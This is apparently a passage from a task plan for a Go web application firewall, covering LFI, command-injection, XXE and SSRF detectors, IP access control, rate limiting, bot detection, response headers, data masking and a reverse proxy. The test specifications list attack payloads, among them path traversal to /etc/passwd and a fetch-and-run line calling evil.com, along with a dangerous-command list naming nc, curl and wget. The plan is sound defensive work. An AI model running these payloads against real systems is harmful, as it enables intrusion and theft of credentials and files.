Test suite for LFI detection. Attack payloads (minimum 30): basic `../../etc/passwd`, encoded `..%2f..%2fetc%2fpasswd`, double-encoded `..%252f..%252f`, Windows-style `..\\..\\windows\\system32\\`, null byte `../../etc/passwd%00.jpg`, wrapper `php://filter/convert.base64-encode/resource=config`, absolute `/etc/shadow`, deeply nested `../../../../../../../etc/passwd`, mixed encoding `..%c0%af..%c0%af`. Benign inputs (minimum 20): normal URL paths, relative image paths (`images/photo.jpg`), paths with dots in filenames (`file.v2.tar.gz`), API versioned paths (`/api/v1/users`).

**Acceptance Criteria:**
- [ ] Minimum 30 attack payloads tested
- [ ] Minimum 20 benign inputs tested
- [ ] All encoding evasion variants tested
- [ ] Windows and Linux paths tested
- [ ] Test data files in testdata/ directory
- [ ] All tests pass

---

### Task 26: Command Injection Detector [M]

**Files:** `internal/layers/detection/cmdi/cmdi.go`, `internal/layers/detection/cmdi/commands.go`, `internal/layers/detection/cmdi/shell.go`

**Dependencies:** Task 5

**Description:**
Implement `CMDiDetector` for OS command injection detection. In `shell.go`, define shell metacharacters and operators: `;`, `|`, `||`, `&&`, `&`, `$()`, backticks, `>`, `>>`, `<`, `$(())`, `{,}` brace expansion, newline `%0a`. In `commands.go`, define dangerous command database: system commands (`cat`, `ls`, `dir`, `type`, `whoami`, `id`, `uname`, `hostname`, `ifconfig`, `ipconfig`, `netstat`, `ps`, `env`, `set`), network commands (`wget`, `curl`, `nc`, `ncat`, `ping`, `nslookup`, `dig`, `telnet`), file commands (`rm`, `del`, `cp`, `mv`, `chmod`, `chown`, `mkdir`), scripting (`python`, `perl`, `ruby`, `php`, `node`, `bash`, `sh`, `cmd`, `powershell`). Detection: find shell metacharacters followed/preceded by command names. Score: shell operator + known command (8), nested command substitution (9), backtick execution (8), pipe chain (7), semicolon + command (7), encoded newline (6).

**Acceptance Criteria:**
- [ ] Detects all shell metacharacters and operators
- [ ] Command database covers system, network, file, scripting categories
- [ ] Scoring based on pattern combinations
- [ ] Handles URL-encoded metacharacters
- [ ] Detects backtick and `$()` command substitution
- [ ] Implements `Detector` interface
- [ ] All tests pass

---

### Task 27: Command Injection Tests [M]

**Files:** `internal/layers/detection/cmdi/cmdi_test.go`, `internal/layers/detection/cmdi/testdata/`

**Dependencies:** Task 26

**Description:**
Test suite for CMDi detection. Attack payloads (minimum 25): basic `; cat /etc/passwd`, pipe `| whoami`, logical `&& id`, backtick with id, substitution `$(whoami)`, encoded `%3B%20cat%20/etc/passwd`, newline `%0aid`, chained `; wget http://evil.com/shell.sh | sh`, Windows-specific `& type C:\\Windows\\system32\\drivers\\etc\\hosts`, PowerShell invocations. Benign inputs (minimum 20): command-like words in sentences ("please select and set the id"), URLs with pipe characters in query strings, mathematical expressions with operators.

**Acceptance Criteria:**
- [ ] Minimum 25 attack payloads tested
- [ ] Minimum 20 benign inputs tested
- [ ] Both Linux and Windows command variants tested
- [ ] Encoding evasion tested
- [ ] Test data files in testdata/ directory
- [ ] All tests pass

---

### Task 28: XXE Detector [M]

**Files:** `internal/layers/detection/xxe/xxe.go`, `internal/layers/detection/xxe/xxe_test.go`, `internal/layers/detection/xxe/testdata/`

**Dependencies:** Task 5

**Description:**
Implement `XXEDetector` for XML External Entity detection. First gate: only process requests with XML content types (`text/xml`, `application/xml`, `*+xml`). Pattern detection in request body: `<!DOCTYPE` declarations (score 3), `<!ENTITY` declarations (score 7), `SYSTEM` keyword in entity declarations (score 9), `PUBLIC` keyword in entity declarations (score 8), `file://` URI in entities (score 9), `http://` URI in entities (score 8), `expect://` URI (score 9), `php://` URI (score 9), parameter entities `%xxe;` (score 7), nested entity references (score 8), `CDATA` sections with suspicious content (score 4). Also detect XXE in non-XML contexts: JSON with XML-like content, multipart forms with XML parts. Tests: minimum 20 XXE payloads (basic external entity, parameter entity, blind XXE via OOB, billion laughs DoS, SSRF via XXE, various URI schemes), minimum 15 benign XML inputs (SVG, SOAP, RSS, normal XML docs).

**Acceptance Criteria:**
- [ ] Content-type gating (only XML types processed fully)
- [ ] Detects DOCTYPE declarations
- [ ] Detects ENTITY declarations with SYSTEM/PUBLIC
- [ ] Detects dangerous URI schemes in entities
- [ ] Detects parameter entities
- [ ] Detects billion laughs / entity expansion attacks
- [ ] Handles XXE in non-XML contexts
- [ ] Minimum 20 attack payloads tested
- [ ] Minimum 15 benign inputs tested
- [ ] Implements `Detector` interface
- [ ] All tests pass

---

### Task 29: SSRF Detector [L]

**Files:** `internal/layers/detection/ssrf/ssrf.go`, `internal/layers/detection/ssrf/ipcheck.go`

**Dependencies:** Task 5

**Description:**
Implement `SSRFDetector` for Server-Side Request Forgery detection. In `ipcheck.go`: implement IP address parsing that handles decimal (`2130706433`), octal (`0177.0.0.1`), hex (`0x7f.0x0.0x0.0x1`), mixed notation (`0x7f.0.0.1`), IPv6 mapped (`::ffff:127.0.0.1`), IPv6 compressed, bracketed IPv6 `[::1]`. Implement `IsPrivate(ip net.IP) bool` checking: RFC 1918 (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), loopback (`127.0.0.0/8`, `::1`), link-local (`169.254.0.0/16`, `fe80::/10`), documentation ranges, `0.0.0.0/8`. In `ssrf.go`: detect URLs in input parameters pointing to internal resources. Patterns: private IP addresses in URLs (score 8), localhost references including alternative representations (score 9), cloud metadata endpoints (`169.254.169.254`, `metadata.google.internal`, `instance-data`) (score 10), DNS rebinding indicators (score 7), URL scheme smuggling (`gopher://`, `dict://`, `ftp://`) (score 8), URL with credentials `http://user:pass@host` (score 5), redirection to internal via `@` or `#` in URL (score 7). Scan query parameters, request body (URL-like strings), and Referer header.

**Acceptance Criteria:**
- [ ] Parses IP in decimal, octal, hex, mixed notation
- [ ] Handles IPv4-mapped IPv6 addresses
- [ ] `IsPrivate()` covers all RFC 1918 and special ranges
- [ ] Detects private IPs in URL parameters
- [ ] Detects localhost in all representations
- [ ] Detects cloud metadata endpoints (AWS, GCP, Azure)
- [ ] Detects URL scheme smuggling
- [ ] Detects URL credential injection
- [ ] Implements `Detector` interface
- [ ] All tests pass

---

### Task 30: Detection Layer Integration [M]

**Files:** `internal/layers/detection/detection.go`, `internal/layers/detection/detector.go`

**Dependencies:** Task 19, Task 22, Task 24, Task 26, Task 28, Task 29

**Description:**
Implement `DetectionLayer` that orchestrates all individual detectors as a single `Layer`. On `Process()`: iterate over all enabled detectors (configurable), run each on the RequestContext, collect all findings, accumulate scores, apply per-detector score multipliers from config (e.g., `sqli_multiplier: 1.5` in paranoia 3), handle detector-specific exclusions (certain paths can exclude certain detectors). Implement finding deduplication: if multiple detectors flag the same input fragment, keep the highest-scoring finding. Apply the overall detection score multiplier from config. Return `ActionBlock` if accumulated score exceeds threshold, `ActionLog` if score > 0 but below threshold, `ActionPass` if score is 0. Include all individual detector findings in the result.

**Acceptance Criteria:**
- [ ] Runs all enabled detectors
- [ ] Per-detector enable/disable from config
- [ ] Per-detector score multipliers applied
- [ ] Finding deduplication by matched value
- [ ] Detector-specific path exclusions
- [ ] Returns ActionBlock when score exceeds threshold
- [ ] Returns ActionLog when score > 0 but below threshold
- [ ] Returns ActionPass when score is 0
- [ ] Implements `Layer` interface
- [ ] All tests pass

---

## Phase 3: IP ACL & Rate Limiting (Tasks 31–38)

### Task 31: Radix Tree Implementation [L]

**Files:** `internal/layers/ipacl/radix.go`

**Dependencies:** None

**Description:**
Implement a compressed Patricia trie (radix tree) optimized for IP address CIDR lookups. Support both IPv4 and IPv6. The trie operates on bit-level prefixes: each node represents a prefix, edges represent bit sequences. `RadixTree` struct with methods: `Insert(cidr string, value interface{}) error` — parse CIDR notation and insert into trie, `Lookup(ip net.IP) (value interface{}, found bool)` — find the longest matching prefix for an IP, `Delete(cidr string) bool` — remove a prefix, `Len() int` — number of entries. Handle: single IPs (`1.2.3.4/32`), subnets (`10.0.0.0/8`), overlapping prefixes (most specific match wins), IPv4-mapped IPv6, default route (`0.0.0.0/0`). Path compression: merge single-child internal nodes to reduce memory. The tree must be safe for concurrent reads (use `sync.RWMutex`). Target: lookup in under 500ns for a tree with 10K entries.

**Acceptance Criteria:**
- [ ] Insert and lookup for IPv4 CIDR ranges
- [ ] Insert and lookup for IPv6 CIDR ranges
- [ ] Longest prefix match (most specific wins)
- [ ] Delete removes entries correctly
- [ ] Path compression reduces memory
- [ ] Handles overlapping prefixes
- [ ] IPv4-mapped IPv6 handled transparently
- [ ] Concurrent read safety with RWMutex
- [ ] Lookup under 500ns with 10K entries
- [ ] All tests pass

---

### Task 32: Radix Tree Tests [M]

**Files:** `internal/layers/ipacl/radix_test.go`

**Dependencies:** Task 31

**Description:**
Comprehensive tests for the radix tree. Test cases: insert single IPv4, insert IPv4 CIDR, lookup exact match, lookup within subnet, lookup no match, longest prefix match with overlapping CIDRs (e.g., `10.0.0.0/8` and `10.1.0.0/16` — lookup `10.1.2.3` should match `/16`), delete and verify miss, IPv6 insert and lookup, IPv6 CIDR ranges, mixed IPv4 and IPv6, IPv4-mapped IPv6 (`::ffff:10.0.0.1` matches `10.0.0.0/8`), default route catches all, empty tree lookup, bulk insert 10K entries and verify lookup performance, concurrent read stress test (100 goroutines). Table-driven tests with clear names.

**Acceptance Criteria:**
- [ ] IPv4 exact match tested
- [ ] IPv4 CIDR range tested
- [ ] Longest prefix match tested
- [ ] Delete and miss tested
- [ ] IPv6 ranges tested
- [ ] IPv4-mapped IPv6 tested
- [ ] Default route tested
- [ ] Bulk insert 10K with performance check
- [ ] Concurrent read test with race detector
- [ ] All tests pass

---

### Task 33: IP ACL Layer [M]

**Files:** `internal/layers/ipacl/ipacl.go`

**Dependencies:** Task 31, Task 5

**Description:**
Implement `IPACLLayer` that enforces IP-based access control. Uses two radix trees: one for whitelist, one for blacklist. Processing order: (1) check whitelist — if IP is whitelisted, immediately return `ActionPass` with no further checks, (2) check blacklist — if IP is blacklisted, return `ActionBlock`. Support auto-ban: the layer maintains an in-memory ban list (map with TTL) for IPs that have been flagged by other layers. `Ban(ip net.IP, duration time.Duration, reason string)` adds to ban list. `Unban(ip net.IP)` removes. A background goroutine cleans expired bans every 30 seconds. `ListBanned() []BanEntry` for API/dashboard. Configuration: load whitelist/blacklist CIDRs from config at startup, support runtime updates via `AddWhitelist(cidr string)` and `AddBlacklist(cidr string)`. Produce findings: blocked IP generates Finding with severity Critical and score equal to threshold (instant block).

**Acceptance Criteria:**
- [ ] Whitelist takes priority over blacklist
- [ ] Whitelisted IPs bypass all further checks
- [ ] Blacklisted IPs are immediately blocked
- [ ] Auto-ban with configurable TTL
- [ ] Expired bans cleaned up automatically
- [ ] Runtime add/remove for whitelist and blacklist
- [ ] ListBanned returns current ban entries
- [ ] Finding produced on block with severity Critical
- [ ] Implements `Layer` interface
- [ ] All tests pass

---

### Task 34: IP ACL Tests [M]

**Files:** `internal/layers/ipacl/ipacl_test.go`

**Dependencies:** Task 33

**Description:**
Test suite for IP ACL layer. Test cases: whitelist allows through, blacklist blocks, whitelist overrides blacklist for same IP, CIDR range whitelist, CIDR range blacklist, auto-ban with expiry (ban, verify blocked, wait for expiry, verify allowed), runtime add whitelist, runtime add blacklist, runtime remove, IPv6 whitelist/blacklist, mixed IPv4/IPv6, empty lists (everything allowed), ban list cleanup goroutine, concurrent ban/check operations, finding generation on block.

**Acceptance Criteria:**
- [ ] Whitelist/blacklist priority tested
- [ ] CIDR ranges tested
- [ ] Auto-ban with TTL tested (use short duration)
- [ ] Runtime modifications tested
- [ ] IPv6 tested
- [ ] Concurrent access tested
- [ ] Finding generation verified
- [ ] All tests pass

---

### Task 35: Token Bucket Implementation [M]

**Files:** `internal/layers/ratelimit/bucket.go`, `internal/layers/ratelimit/bucket_test.go`

**Dependencies:** None

**Description:**
Implement token bucket rate limiter with lazy refill. `TokenBucket` struct: `capacity int` (max tokens), `tokens float64` (current), `rate float64` (tokens per second), `lastRefill time.Time`. `Allow() bool` — refill tokens based on elapsed time since last check, then try to consume one token. Returns true if token available, false if bucket empty. `AllowN(n int) bool` — consume N tokens. Implement `BucketStore` that manages per-key buckets: `BucketStore` struct with `map[string]*TokenBucket` and `sync.RWMutex`. `GetOrCreate(key string, capacity int, rate float64) *TokenBucket`. Implement cleanup: a background goroutine removes buckets that have been idle (full and unused) for longer than 2x the window duration. This prevents memory leak from abandoned client IPs.

**Acceptance Criteria:**
- [ ] Token bucket with lazy refill on each call
- [ ] `Allow()` correctly consumes one token
- [ ] `AllowN()` correctly consumes N tokens
- [ ] Bucket refills over time at configured rate
- [ ] `BucketStore` manages per-key buckets
- [ ] `GetOrCreate` returns existing or creates new bucket
- [ ] Idle bucket cleanup prevents memory leak
- [ ] Thread-safe for concurrent access
- [ ] All tests pass

---

### Task 36: Rate Limiter Layer [M]

**Files:** `internal/layers/ratelimit/ratelimit.go`

**Dependencies:** Task 35, Task 5, Task 33

**Description:**
Implement `RateLimitLayer` as a `Layer`. Support multiple rate limit rules, each with: `scope` (ip, ip+path, ip+method, global), `requests` (max requests in window), `window` (time duration), `burst` (max burst above rate — sets bucket capacity to requests + burst). On `Process()`: extract the key based on scope (e.g., for ip+path: `clientIP + ":" + path`), check the corresponding bucket. If rate exceeded: produce Finding with severity High and score from config (default 5 per violation). Support `auto_ban` integration: if an IP exceeds rate limits N times (configurable, default 5) within a window, call `IPACLLayer.Ban()` to auto-ban. Track violation counts per IP in a separate map with TTL cleanup. Include `Retry-After` header value in Finding metadata for the response layer to use. Return `ActionBlock` on rate limit exceeded, `ActionPass` otherwise.

**Acceptance Criteria:**
- [ ] Multiple rate limit rules supported
- [ ] Scope-based key extraction (ip, ip+path, ip+method, global)
- [ ] Burst support via token bucket capacity
- [ ] Finding produced with severity High on rate exceeded
- [ ] Auto-ban after configurable violation count
- [ ] Retry-After value calculated and included in metadata
- [ ] Returns ActionBlock when rate exceeded
- [ ] Violation count tracking with TTL cleanup
- [ ] Implements `Layer` interface
- [ ] All tests pass

---

### Task 37: Rate Limiter Tests [M]

**Files:** `internal/layers/ratelimit/ratelimit_test.go`

**Dependencies:** Task 36

**Description:**
Test suite for rate limiter. Test cases: basic rate limit (N requests allowed, N+1 blocked), burst allows temporary excess, rate recovery over time (wait, then requests allowed again), scope=ip (different IPs have separate limits), scope=ip+path (same IP different paths have separate limits), scope=global (all requests share one limit), multiple rules applied (most restrictive wins), auto-ban trigger after N violations, Retry-After calculation accuracy, concurrent requests from many IPs (verify no race conditions), bucket cleanup after idle period, finding generation with correct fields.

**Acceptance Criteria:**
- [ ] Basic rate limiting tested
- [ ] Burst allowance tested
- [ ] Rate recovery tested
- [ ] All scopes tested (ip, ip+path, ip+method, global)
- [ ] Multiple rules tested
- [ ] Auto-ban integration tested
- [ ] Retry-After accuracy tested
- [ ] Concurrent access with race detector
- [ ] Bucket cleanup tested
- [ ] All tests pass

---

### Task 38: Rate Limiter + IP ACL Integration Tests [S]

**Files:** `internal/layers/ratelimit/ratelimit_test.go` (extend), `internal/layers/ipacl/ipacl_test.go` (extend)

**Dependencies:** Task 34, Task 37

**Description:**
Integration tests that verify the interaction between IP ACL and Rate Limiter layers. Test scenarios: (1) whitelisted IP bypasses rate limiting (verify the pipeline short-circuits), (2) rate limit auto-ban adds IP to ban list, subsequent requests blocked by IP ACL layer before reaching rate limiter, (3) auto-ban expiry allows IP back through rate limiter, (4) manually blacklisted IP never reaches rate limiter, (5) rate limit + IP ACL combined in pipeline execution order. These tests create both layers and a mini-pipeline to verify end-to-end behavior.

**Acceptance Criteria:**
- [ ] Whitelisted IP bypasses rate limiting
- [ ] Auto-ban from rate limiter blocks at IP ACL level
- [ ] Auto-ban expiry restores access
- [ ] Blacklisted IP never reaches rate limiter
- [ ] Pipeline execution order verified
- [ ] All tests pass

---

## Phase 4: Bot Detection & Response (Tasks 39–48)

### Task 39: JA3 Fingerprint Computation [M]

**Files:** `internal/layers/botdetect/ja3.go`

**Dependencies:** Task 5

**Description:**
Implement JA3 fingerprint extraction from TLS connection information. JA3 is computed from the TLS ClientHello: `SSLVersion,Ciphers,Extensions,EllipticCurves,EllipticCurvePointFormats`. Since Go's `crypto/tls` does not expose the raw ClientHello, implement extraction via `tls.Config.GetConfigForClient` callback which receives `*tls.ClientHelloInfo`. From `ClientHelloInfo`, extract: `ServerName`, `SupportedVersions`, `CipherSuites`, `SupportedCurves`, `SupportedPoints`. Compute JA3 string: join fields with commas, sub-fields with dashes. Then MD5 hash the string (implement MD5 by hand — no `crypto/md5` import, to maintain zero-dep; alternatively use the stdlib `crypto/md5` since it is part of Go stdlib and not an external dependency). Store fingerprint on the connection context. `ComputeJA3(info *tls.ClientHelloInfo) string` returns the hex-encoded MD5 hash.

**Acceptance Criteria:**
- [ ] Extracts TLS version, cipher suites, extensions, curves, point formats
- [ ] Computes JA3 string in correct format
- [ ] MD5 hash computed (using Go stdlib crypto/md5 is acceptable)
- [ ] Returns hex-encoded fingerprint string
- [ ] Handles missing fields gracefully (empty extensions, etc.)
- [ ] Fingerprint stored for per-request access
- [ ] All tests pass

---

### Task 40: JA3 Embedded Fingerprint Database [M]

**Files:** `internal/layers/botdetect/fingerprints.go`

**Dependencies:** Task 39

**Description:**
Create an embedded database of known JA3 fingerprints. Categories: `known_good` (common browsers: Chrome, Firefox, Safari, Edge — multiple versions each with their JA3 hashes), `known_bad` (known scanners: Nmap, sqlmap, Nikto, WPScan, Nuclei, curl default, Python requests default, Go net/http default, custom malware C2 fingerprints), `suspicious` (uncommon TLS stacks, outdated cipher suites, unusual extension combinations). Store as `map[string]FingerprintInfo` where `FingerprintInfo` has `Category` (good/bad/suspicious), `Name` string, `Score` int (good=0, suspicious=3, bad=7). Implement `LookupJA3(hash string) (FingerprintInfo, bool)`. Include at least 30 known good, 20 known bad, and 10 suspicious fingerprints. Source fingerprints from well-known public JA3 databases.

**Acceptance Criteria:**
- [ ] At least 30 known good fingerprints (major browsers)
- [ ] At least 20 known bad fingerprints (scanners/tools)
- [ ] At least 10 suspicious fingerprints
- [ ] `LookupJA3` returns category and score
- [ ] FingerprintInfo includes human-readable name
- [ ] Scores: good=0, suspicious=3, bad=7
- [ ] All tests pass

---

### Task 41: User-Agent Analyzer [M]

**Files:** `internal/layers/botdetect/useragent.go`

**Dependencies:** Task 5

**Description:**
Implement User-Agent analysis for bot detection. Pattern categories: `known_scanners` — match strings like `sqlmap`, `nikto`, `nmap`, `dirbuster`, `gobuster`, `wpscan`, `nuclei`, `acunetix`, `nessus`, `burp`, `zaproxy` (score 8 each). `known_bots` — `Googlebot`, `Bingbot`, `Slurp`, `DuckDuckBot`, `Baiduspider`, `YandexBot` (score 0 — legitimate bots). `suspicious_patterns` — empty User-Agent (score 5), very short UA under 10 chars (score 4), UA containing only a URL (score 3), UA with script-like content (score 7), UA claiming to be a browser but with inconsistent tokens (score 4). `library_defaults` — `python-requests`, `Go-http-client`, `Java/`, `libwww-perl`, `Ruby`, `PHP/` (score 3 — might be legitimate API clients). Implement `AnalyzeUA(ua string) UAResult` with `Category`, `Name`, `Score`, `IsBot bool`.

**Acceptance Criteria:**
- [ ] Known scanner detection (sqlmap, nikto, etc.)
- [ ] Known legitimate bot detection (Googlebot, etc.)
- [ ] Suspicious pattern detection (empty UA, short UA)
- [ ] Library/scripting language default UA detection
- [ ] Returns category, name, score, isBot flag
- [ ] Case-insensitive matching
- [ ] At least 15 known scanner patterns
- [ ] At least 10 known bot patterns
- [ ] All tests pass

---

### Task 42: Behavioral Analysis [L]

**Files:** `internal/layers/botdetect/behavior.go`

**Dependencies:** Task 5

**Description:**
Implement per-IP behavioral analysis to detect bot-like request patterns. Use a sliding window ring buffer per IP to track request timestamps and characteristics. `BehaviorTracker` struct: manages per-IP `BehaviorWindow` entries. Each `BehaviorWindow` tracks (over configurable window, default 60 seconds): request count, unique paths count, average time between requests (regularity), 4xx error rate, sequential path access patterns (bots often hit paths in alphabetical/sequential order), request size variance (bots tend to have identical request sizes), unique query parameter ratio. Scoring: high request rate (>10 req/s) = score 4, very regular timing (stddev < 50ms) = score 5, high 4xx rate (> 50%) = score 4, low path diversity with high volume = score 3, sequential path pattern = score 4. Implement `RecordRequest(ip net.IP, path string, status int, timestamp time.Time)` and `Analyze(ip net.IP) BehaviorResult`. Use `sync.Pool` for window allocation. Cleanup idle entries after 5 minutes.

**Acceptance Criteria:**
- [ ] Per-IP sliding window tracking
- [ ] Request rate calculation
- [ ] Timing regularity (standard deviation)
- [ ] 4xx error rate tracking
- [ ] Path diversity analysis
- [ ] Sequential path pattern detection
- [ ] Scoring for each behavioral indicator
- [ ] Idle entry cleanup after configurable timeout
- [ ] Memory-efficient (sync.Pool, ring buffer)
- [ ] Thread-safe for concurrent access
- [ ] All tests pass

---

### Task 43: Bot Detection Layer Integration [M]

**Files:** `internal/layers/botdetect/botdetect.go`

**Dependencies:** Task 39, Task 40, Task 41, Task 42

**Description:**
Implement `BotDetectLayer` combining JA3, User-Agent, and behavioral analysis. On `Process()`: (1) check JA3 fingerprint if TLS info available, (2) analyze User-Agent, (3) check behavioral patterns. Combine scores from all three sources. Apply configurable weights: `ja3_weight` (default 1.0), `ua_weight` (default 1.0), `behavior_weight` (default 1.0). Skip JA3 for non-TLS connections. Known legitimate bots (Googlebot, etc.) can be verified: if UA claims to be Googlebot, optionally verify via reverse DNS (note: in initial implementation, just trust the UA for known bots — DNS verification is a future enhancement). Return findings for each detection source that contributed score. If combined weighted score exceeds bot threshold (default 8), return `ActionBlock`. Support a challenge action: if score is between 5 and threshold, return `ActionChallenge` (for future JavaScript challenge implementation).

**Acceptance Criteria:**
- [ ] Combines JA3, UA, and behavior scores
- [ ] Configurable weights per detection source
- [ ] Skips JA3 for non-TLS connections
- [ ] Known legitimate bots scored at 0
- [ ] ActionBlock when combined score exceeds threshold
- [ ] ActionChallenge for medium scores
- [ ] Individual findings from each source
- [ ] Implements `Layer` interface
- [ ] All tests pass

---

### Task 44: Bot Detection Tests [M]

**Files:** `internal/layers/botdetect/botdetect_test.go`, `internal/layers/botdetect/ja3_test.go`

**Dependencies:** Task 43

**Description:**
Test suite for bot detection. JA3 tests: compute fingerprint from mock ClientHelloInfo, verify known good hash matches, verify known bad hash detected, unknown hash scored as suspicious. UA tests: known scanner detected and blocked, legitimate bot allowed, empty UA flagged, browser UA passes, library UA gets low score. Behavior tests: normal browsing pattern passes, high-frequency requests flagged, regular timing flagged, high 4xx rate flagged, sequential paths flagged. Integration tests: combined scoring — bad JA3 + scanner UA = high score block, good JA3 + normal UA + suspicious behavior = moderate score log, all clean = pass. Edge cases: no TLS info, missing UA header, first request from IP (no behavior history).

**Acceptance Criteria:**
- [ ] JA3 fingerprint computation tested
- [ ] JA3 database lookup tested
- [ ] User-Agent analysis tested for all categories
- [ ] Behavioral analysis tested for all indicators
- [ ] Combined scoring tested
- [ ] Weight configuration tested
- [ ] Edge cases tested (no TLS, no UA, new IP)
- [ ] All tests pass

---

### Task 45: Response Protection — Security Headers [M]

**Files:** `internal/layers/response/response.go`, `internal/layers/response/headers.go`

**Dependencies:** Task 5

**Description:**
Implement `ResponseLayer` that modifies HTTP responses before they reach the client. In `headers.go`: define default security headers: `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY` (configurable: DENY/SAMEORIGIN), `X-XSS-Protection: 0` (deprecated but included for legacy), `Strict-Transport-Security: max-age=31536000; includeSubDomains` (only for HTTPS), `Content-Security-Policy: default-src 'self'` (configurable), `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy: camera=(), microphone=(), geolocation=()`, `Cache-Control: no-store` (for error pages), custom headers from config. In `response.go`: implement `ResponseLayer` that wraps `http.ResponseWriter` to intercept `WriteHeader()` and `Write()`. On `WriteHeader()`: inject security headers. Support per-path header overrides (e.g., API endpoints might need different CSP). Remove server identification headers: strip `Server`, `X-Powered-By`, `X-AspNet-Version`.

**Acceptance Criteria:**
- [ ] All default security headers injected
- [ ] HSTS only added for HTTPS connections
- [ ] Configurable header values (CSP, X-Frame-Options)
- [ ] Custom headers from config supported
- [ ] Per-path header overrides
- [ ] Server identification headers stripped
- [ ] ResponseWriter wrapper intercepts correctly
- [ ] Implements `Layer` interface
- [ ] All tests pass

---

### Task 46: Data Masking [M]

**Files:** `internal/layers/response/masking.go`

**Dependencies:** Task 45

**Description:**
Implement response body data masking to prevent accidental data leakage. `DataMasker` scans response bodies for sensitive patterns and replaces them. Patterns: credit card numbers (Visa 4xxx, Mastercard 5xxx, Amex 3xxx — 13-19 digits with optional separators, validated with Luhn algorithm), SSN (NNN-NN-NNNN pattern), API keys (common formats: `sk_live_`, `pk_live_`, `AKIA` AWS keys, `ghp_` GitHub tokens, `xoxb-` Slack tokens, generic hex strings 32+ chars preceded by keywords like `key`, `token`, `secret`, `password`), email addresses in error messages. Masking: replace middle portion with asterisks, keeping first and last 4 chars for credit cards (`4111****1111`), full mask for SSN (`***-**-****`), partial mask for API keys (`sk_live_****...****`). Only mask when `masking.enabled` is true in config. Only scan `text/*` and `application/json` content types. Buffer the response body, scan, mask, then write.

**Acceptance Criteria:**
- [ ] Credit card detection with Luhn validation
- [ ] SSN pattern detection
- [ ] API key pattern detection (AWS, GitHub, Slack, generic)
- [ ] Email address detection in error contexts
- [ ] Correct masking format for each pattern type
- [ ] Content-type gating (only text and JSON)
- [ ] Configurable enable/disable
- [ ] Buffered response body scanning
- [ ] Performance: minimal latency impact on non-matching responses
- [ ] All tests pass

---

### Task 47: Error Pages [S]

**Files:** `internal/layers/response/errorpage.go`

**Dependencies:** Task 45

**Description:**
Implement error page generation for blocked requests. Two modes: `production` — minimal, non-informative error page with customizable branding (HTML template with title, message, request ID, support contact). `development` — detailed error page showing: which rules triggered, individual findings with scores, matched values (truncated), client IP, request details, total score vs threshold. Implement `ErrorPageRenderer` with `Render(event *Event, mode string) []byte`. HTML templates are embedded as Go string constants (no external files). Production page: clean design, WAF branding, request ID for support reference. Development page: collapsible sections, color-coded severity levels. Support custom error page via config: if `response.custom_error_page` path is set, read that file instead. HTTP status code: 403 for blocked, 429 for rate limited.

**Acceptance Criteria:**
- [ ] Production mode: minimal, non-informative page
- [ ] Development mode: detailed findings display
- [ ] Request ID included in both modes
- [ ] HTML templates as Go string constants
- [ ] Custom error page override from config
- [ ] Correct HTTP status codes (403, 429)
- [ ] Clean, readable HTML output
- [ ] All tests pass

---

### Task 48: Response Layer Tests [M]

**Files:** `internal/layers/response/response_test.go`

**Dependencies:** Task 45, Task 46, Task 47

**Description:**
Test suite for the response layer. Security headers tests: verify all default headers injected, HSTS only on HTTPS, custom headers from config, per-path overrides, server header stripping. Data masking tests: credit card detection and masking (Visa, Mastercard, Amex), Luhn validation (valid vs invalid card numbers), SSN masking, API key masking (each format), email masking, non-text content types skipped, disabled masking passes through unchanged. Error page tests: production mode has no findings details, development mode shows all findings, request ID present, custom error page loaded, 403 vs 429 status codes. Integration test: full response cycle through ResponseLayer with mock upstream response.

**Acceptance Criteria:**
- [ ] All security header scenarios tested
- [ ] Credit card masking tested with Luhn validation
- [ ] SSN, API key, email masking tested
- [ ] Content-type filtering tested
- [ ] Both error page modes tested
- [ ] Custom error page tested
- [ ] Status code correctness tested
- [ ] Integration test with full response cycle
- [ ] All tests pass

---

## Phase 5: Reverse Proxy (Tasks 49–58)

### Task 49: HTTP Reverse Proxy [M]

**Files:** `internal/proxy/proxy.go`

**Dependencies:** Task 11

**Description:**
Implement a basic HTTP reverse proxy using Go's `net/http` stdlib. `ReverseProxy` struct wraps a custom `http.Transport` with connection pooling. `NewReverseProxy(cfg *config.ProxyConfig) (*ReverseProxy, error)`. The proxy: reads the target backend from config/load balancer, rewrites the request (update Host header, scheme, path prefix if configured), forwards the request via `Transport.RoundTrip()`, copies response headers and body back to the client. Configure the `Transport`: `MaxIdleConns` (default 100), `MaxIdleConnsPerHost` (default 10), `IdleConnTimeout` (default 90s), `TLSHandshakeTimeout` (default 10s), `ResponseHeaderTimeout` (default 30s), `DisableCompression` (false). Support path-based routing: different path prefixes route to different backend groups. Implement `ServeHTTP(w http.ResponseWriter, r *http.Request)` for use as http.Handler. Add request/response hooks for WAF integration (the engine middleware wraps this handler). Handle hop-by-hop headers: strip `Connection`, `Keep-Alive`, `Proxy-*`, `TE`, `Trailer`, `Transfer-Encoding`, `Upgrade` (except for WebSocket).

**Acceptance Criteria:**
- [ ] Forwards requests to backend servers
- [ ] Connection pooling with configurable limits
- [ ] Host header rewriting
- [ ] Path prefix routing
- [ ] Hop-by-hop header stripping
- [ ] Response copying (headers + body + status)
- [ ] Timeout configuration
- [ ] Implements http.Handler
- [ ] All tests pass

---

### Task 50: Load Balancer [M]

**Files:** `internal/proxy/loadbalancer.go`

**Dependencies:** Task 49

**Description:**
Implement multiple load balancing algorithms. `LoadBalancer` interface: `Next() *Backend`, `AddBackend(b *Backend)`, `RemoveBackend(addr string)`, `SetHealthy(addr string, healthy bool)`. `Backend` struct: `Address string`, `Weight int`, `Healthy bool`, `ActiveConns int64` (atomic). Algorithms: (1) `RoundRobinLB` — simple rotation, skip unhealthy. (2) `WeightedRoundRobinLB` — smooth weighted round-robin (Nginx-style): each backend has `currentWeight`, on each call add `effectiveWeight` to `currentWeight`, select highest, subtract total weight. (3) `LeastConnectionsLB` — select backend with fewest active connections (track via atomic int64 incremented on request start, decremented on response complete). (4) `IPHashLB` — consistent hashing based on client IP (FNV-1a hash of IP string, modulo backend count, skip unhealthy with linear probing). All implementations skip unhealthy backends. If all backends unhealthy, return least-recently-marked-unhealthy.

**Acceptance Criteria:**
- [ ] Round-robin distributes evenly, skips unhealthy
- [ ] Weighted round-robin distributes proportionally to weight
- [ ] Least-connections selects backend with fewest active
- [ ] IP-hash is consistent (same IP goes to same backend)
- [ ] All algorithms skip unhealthy backends
- [ ] Fallback when all backends unhealthy
- [ ] AddBackend/RemoveBackend modify live pool
